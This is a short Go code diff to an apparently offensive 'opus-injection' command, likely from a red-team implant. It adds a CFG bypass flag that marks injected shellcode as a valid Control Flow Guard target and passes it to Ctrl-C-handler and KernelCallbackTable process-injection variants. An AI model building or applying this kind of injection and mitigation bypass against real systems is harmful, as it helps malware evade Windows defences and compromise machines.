@@ -109,6 +109,7 @@ type OpusInjectionParams struct {
 	ShellcodeB64 string `json:"shellcode_b64"`
 	PID          int    `json:"pid"`
 	Variant      int    `json:"variant"`
+	CFGBypass    bool   `json:"cfg_bypass"` // Mark shellcode as valid CFG target before callback execution
 }
 
 // Execute executes the opus-injection command
@@ -142,9 +143,9 @@ func (c *OpusInjectionCommand) Execute(task structs.Task) structs.CommandResult 
 	var output string
 	switch params.Variant {
 	case 1:
-		output, err = executeOpusVariant1(shellcode, uint32(params.PID))
+		output, err = executeOpusVariant1(shellcode, uint32(params.PID), params.CFGBypass)
 	case 4:
-		output, err = executeOpusVariant4(shellcode, uint32(params.PID))
+		output, err = executeOpusVariant4(shellcode, uint32(params.PID), params.CFGBypass)
 	default:
 		return errorf("Error: Unsupported variant %d. Currently supported: 1 (Ctrl-C Handler), 4 (KernelCallbackTable)", params.Variant)
 	}
